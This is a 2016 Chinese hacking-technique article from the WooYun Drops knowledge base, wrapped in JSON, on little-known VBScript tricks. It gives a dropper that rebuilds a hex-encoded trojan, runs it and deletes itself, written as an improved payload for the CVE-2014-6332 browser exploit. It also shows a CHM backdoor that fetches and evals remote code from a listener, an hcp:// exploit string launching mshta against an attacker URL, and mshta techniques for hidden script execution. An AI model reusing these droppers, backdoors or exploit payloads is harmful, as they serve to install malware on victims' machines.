{"_id":"578716fe2058582e3511738f","title":"昨日黄花--vbscript（一）","summary":"0x00 前言 python、powershell、php在脚本编程界的地位如日中天，vbscript已零落成 [...]","author":"","url":"http://drops.wooyun.org/tips/17725","content":"<h1>0x00 前言</h1>\n<hr>\n<p>python、powershell、php在脚本编程界的地位如日中天，vbscript已零落成泥碾作尘，已成昨日黄花。犹记得zzzevazzz在2004年前有两篇文章横空出世，分别是《深入挖掘Windows脚本技术》和《Do All in Cmd Shell (一切尽在命令行)》，博得一片惊叹，引起广大反响。但12年过去了，vbscript在黑客界的地位逐渐势微，连微软脚本专家都放弃了它，更多的人转向了powershell在黑客方面的研究。</p>\n<p>我写这篇文章，一方面是对zzzevzaaa的文章的挂漏补遗，另一方面展现vbs一些小技巧，更重要的是对自己放弃在vbs方面研究的缅怀。</p>\n\n<h1>0x01 vbs写二进制字节的代码以及利用</h1>\n<hr>\n<p>《Do All in Cmd Shell (一切尽在命令行)》这里写到过一个问题：echo命令加重定向操作符可以写入ASCII码小于128的字符，但大于等于128的不行。只有将本地文件重新”编码”为可显示的字符，才能方便地写入远程主机。首先能想到的就是base64编码，即email附件的编码方式。但vbs不支持位操作，因此编码和解码较复杂。更麻烦的是，脚本以二进制流方式处理文件的能力很差。（ADODB.Stream可以以流方式写文件，但我无法构造出相应的数据类型。二进制数据流可以用midb函数转成字符串，但反过来不行。我花了两天时间，还是没能解决这个问题。如果有谁能用vbs或js写任意的字节数据到文件中，恳请赐教。）</p>\n<p>先来说一下vbs写base64字节流还原二进制，用Microsoft.XMLDOM组件来解决就很简单了。关键函数如下：</p>\n<pre class=\"brush: vb; notranslate\">private function readBytes(file)\n  dim inStream\n  ' ADODB stream object used\n  set inStream = WScript.CreateObject(&quot;ADODB.Stream&quot;)\n  ' open with no arguments makes the stream an empty container \n  inStream.Open\n  inStream.type= TypeBinary\n  inStream.LoadFromFile(file)\n  readBytes = inStream.Read()\nend function\n\nprivate function encodeBase64(bytes)\n  dim DM, EL\n  Set DM = CreateObject(&quot;Microsoft.XMLDOM&quot;)\n  ' Create temporary node with Base64 data type\n  Set EL = DM.createElement(&quot;tmp&quot;)\n  EL.DataType = &quot;bin.base64&quot;\n  ' Set bytes, get encoded String\n  EL.NodeTypedValue = bytes\n  encodeBase64 = EL.Text\nend function\n\nprivate function decodeBase64(base64)\n  dim DM, EL\n  Set DM = CreateObject(&quot;Microsoft.XMLDOM&quot;)\n  ' Create temporary node with Base64 data type\n  Set EL = DM.createElement(&quot;tmp&quot;)\n  EL.DataType = &quot;bin.base64&quot;\n  ' Set encoded String, get bytes\n  EL.Text = base64\n  decodeBase64 = EL.NodeTypedValue\nend function\n\nprivate Sub writeBytes(file, bytes)\n  Dim binaryStream\n  Set binaryStream = CreateObject(&quot;ADODB.Stream&quot;)\n  binaryStream.Type = TypeBinary\n  'Open the stream and write binary data\n  binaryStream.Open\n  binaryStream.Write bytes\n  'Save binary data to disk\n  binaryStream.SaveToFile file, ForWriting\nEnd Sub\n</pre>\n<p>全部代码在这https://ghads.wordpress.com/2008/10/17/vbscript-readwrite-binary-encodedecode-base64/，编码和解码的效率还是不错的。</p>\n<p>如果用ADODB.Recordset组件还原16进制为二进制文件，效率稍差，但也是可以做到的。说到vbs写二进制文件，有没有想到袁哥哪个ie的神洞CVE-2014-6332呢？我个人收集了一些这个网马样本，但90%用的是下载执行的方法，还有的样本甚至用了ftp下载执行的办法，其实不必哪么麻烦。袁哥给出的样本在这http://www.freebuf.com/articles/system/51501.html，我们可以把其中的runmumaa()函数改写如下代码，这样就利索多了：</p>\n<pre class=\"brush: vb; notranslate\">Function runmumaa() \nSet Fso=CreateObject(&quot;Scripting.FileSystemObject&quot;)\npath=&quot;C:\\ProgramData\\Microsoft\\Windows\\DRM\\&quot;\nIf Not (fso.FolderExists(path)) Then\npath= &quot;C:\\docume~1\\alluse~1\\&quot;\nEnd If\n\nSet ws = CreateObject(&quot;Wscript.Shell&quot;)\n\nSet wf=fso.OpenTextFile(path&amp;&quot;test.vbs&quot;,2, True)\nwf.write &quot;fp=&quot;&quot;&quot;&amp;path&amp;&quot;0day.exe&quot;&quot;:set fs=CreateObject(&quot;&quot;Scripting.FileSystemObject&quot;&quot;):set ws= Createobject(&quot;&quot;WScript.Shell&quot;&quot;):ss=&quot;&quot;4D5A9000'木马的16进制编码&quot;&quot;:Set RS = CreateObject(&quot;&quot;ADODB.Recordset&quot;&quot;):L = Len(ss) / 2:RS.Fields.Append &quot;&quot;m&quot;&quot;, 205, L:RS.Open:RS.AddNew:RS(&quot;&quot;m&quot;&quot;) = ss &amp; ChrB(0):RS.Update:ss = RS(&quot;&quot;m&quot;&quot;).GetChunk(L):Set s = CreateObject(&quot;&quot;ADODB.Stream&quot;&quot;):With s: .Mode = 3:.Type = 1:.Open:.Write ss:.SaveToFile fp, 2:End With:ws.run fp:fs.DeleteFile(wscript.scriptfullname)&quot;\nwf.close\nSet wf=Nothing\n\nset objShellApp=CreateObject(&quot;Shell.Application&quot;)\nIf (fso.FileExists(path&amp;&quot;dell.vbs&quot;)) Then\n\n\nSet objFolder = objShellApp.NameSpace(path)\nobjFolder.Items().item(&quot;test.vbs&quot;).invokeverb\n\n\nEnd If\n\nend Function\n</pre>\n<h1>0x02 vbs在协议方面的代码以及利用</h1>\n<hr>\n<p>wooyun知识库有篇文章，《高级组合技打造“完美” 捆绑后门》（http://drops.wooyun.org/tips/14254），主要说的是用powershell方法来制作一个chm后门。文章写得很好，但会忽略了一部分xp用户。如果让chm不弹不闪执行一个exe的话，为什么不用vbs呢？原文中最终的代码如下：</p>\n<pre class=\"brush: vb; notranslate\">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;\n   This is a demo ! &lt;br&gt;\n&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;\n&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;\n &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;\n &lt;PARAM name=&quot;Item1&quot; value=',rundll32.exe,javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.1.101:8080/connect&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);}'&gt;\n &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;\n&lt;/OBJECT&gt;\n&lt;SCRIPT&gt;\nx.Click();\n&lt;/SCRIPT&gt;\n&lt;/body&gt;&lt;/html&gt;\n</pre>\n<p>它这里Item1用的value值是rundll32.exe,javascript来执行的js代码，其实这里我们可以用mshta来执行vbs或js。有一个比较简单的思路是在chm主页中嵌入一个htm。像代码是<code>&lt;img src=1.htm&gt;</code>,然后利用CDO.Message来读<code>mk:@MSITStore</code>协议或是<code>ms-its</code>协议，然后这个1.htm里是你的vbs代码，这样你就为所欲为了。</p>\n<p>示例代码： <code>mshta mk:@MSITStore:H:\\i\\d盘\\old\\easychm\\d.chm::/1.htm</code>(如图1)</p>\n<p><img alt=\"\" origin-src=\"http://static.wooyun.org//drops/20160714/201607140425289268617.jpg\" lazy-src=\"http://static.wooyun.org//drops/20160714/201607140425289268617.jpg\"></p>\n<p>或是：<code>mshta its:H:\\i\\d盘\\old\\easychm\\d.chm::/1.htm</code></p>\n<p>或是：<code>mshta ms-its:H:\\i\\d盘\\old\\easychm\\d.chm::/1.htm</code>。</p>\n<p>说到这里，有没有又想到几年前的哪个hcp协议漏洞呢（ M10-042）？如果我们用到mshta的话，就不用在url里写哪么多代码了。示例如下：</p>\n<pre class=\"brush: html; notranslate\">&lt;iframe src=&quot;hcp://services/search?query=anything&amp;topic=hcp://system/sysinfo/sysinfomain.htm%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A..%5C..%5Csysinfomain.htm%u003fsvr=%3Cscript/defer%3Eeval%28unescape%28%27Run%2528%2522mshta%2520http%253A//attackUrl%2522%2529%27%29%29%3C/script%3E&quot;&gt;\n</pre>\n<h1>0x03 mstha运行vbs的代码以及利用</h1>\n<hr>\n<p>在文章第二部分，我用到了mshta来直接运行<code>mk:@MSITStore:H:\\i\\d盘\\old\\easychm\\d.chm::/1.htm</code>。我估计很多人有疑惑，你把chm代码发给对方后，你如何判断对方chm的具体位置呢？其实这个就涉及到mshta如何来运行vbs了。几年前我在&lt;&lt;黑客手册&gt;&gt;这本书里写到&lt;&lt;非常规运行vbs&gt;&gt;给出的示例代码是：<code>mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;%~nx0 h&quot;,0)(window.close)</code>。这里的方法有个极大的弊端，代码之间不能有空格，例如只能写<code>mshta vbscript:msgbox(&quot;a&quot;)</code>，而不能写成<code>mshta vbscript:msgbox &quot;a&quot;</code>，写成后一种会出错。其实我觉得这种写法应当是微软的bug或是微软的宽容，mstha应当运行的是vbscript而不是vbs。所以深入一下我们就明白发如何在mshta随心所欲写vbs了。</p>\n<p>批处理之家http://www.bathome.net/thread-11516-1-1.html，myzam提到了几种mshta写vbscript的方法，给出的代码分别是：</p>\n<ol>\n<li><code>mshta vbscript:&quot;&lt;html style=background:buttonface&gt;&lt;title&gt;作者:myzam 2011-3-18&lt;/title&gt;&lt;body&gt;hello world&lt;br/&gt;hello&lt;hr/&gt;world&lt;script language=vbscript&gt;msgbox (123)&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&quot;</code></li>\n<li><code>mshta vbscript:&quot;&lt;html &gt;&lt;title&gt;test&lt;/title&gt;&lt;body&gt;hello world &lt;script language='vbscript'&gt;msgbox (&quot;&quot;hello world&quot;&quot;) &lt;/script&gt;&lt;/html&gt;&quot;</code></li>\n<li><code>mshta vbscript:&quot;&lt;html &gt;&lt;title&gt;test&lt;/title&gt;&lt;body&gt;hello world &lt;script language=&quot;&quot;vbscript&quot;&quot;&gt;msgbox (&quot;&quot;hello world&quot;&quot;) &lt;/script&gt;&lt;/html&gt;&quot;</code></li>\n</ol>\n<p>这样的写法是可以的，但是你不会觉得双引号转义来转义去的麻烦呢，而且还是有空格的问题。既然mshta调用的是ie，有没有想到过ie地址栏的一些特性呢，所以我们最终代码是：</p>\n<p><code>mshta &quot;about:&lt;script language=vbs&gt; msgbox &quot;a&quot; :window.close &lt;/script&gt;&quot;</code></p>\n<p>用了about就不怕有空格了，代码就随意了。</p>\n<p>以上三点是vbs的一些不常见的技巧和巧妙的代码，当然这样的技巧还是有很多的，哪就放在昨日黄花--vbscript（二）吧。</p>\n<h2>文中参考文献</h2>\n<ul>\n<li>http://huaidan.org/archives/251.html</li>\n<li>https://ghads.wordpress.com/2008/10/17/vbscript-readwrite-binary-encodedecode-base64/</li>\n<li>http://www.freebuf.com/articles/system/51501.html</li>\n<li>http://drops.wooyun.org/tips/14254</li>\n<li>http://www.bathome.net/thread-11516-1-1.html</li>\n<li>http://demon.tw/?s=%E4%BA%8C%E8%BF%9B%E5%88%B6</li>\n</ul>","time":"2016-07-14T04:29:40.000Z","siteTitle":"乌云知识库","siteId":"55025ee6f395d9909c3efa1f","feature_image":"http://static.wooyun.org//drops/20160714/201607140425289268617.jpg","siteUrl":"http://drops.wooyun.org/feed","favoriteCount":0,"likeCount":0,"readCount":33,"images":[{"url":"http://static.wooyun.org//drops/20160714/201607140425289268617.jpg","width":879,"height":333,"_id":"5806dc768fe838b05b12c51e"}],"tags":["技术分享"],"createAt":"2016-07-14T04:37:18.645Z"}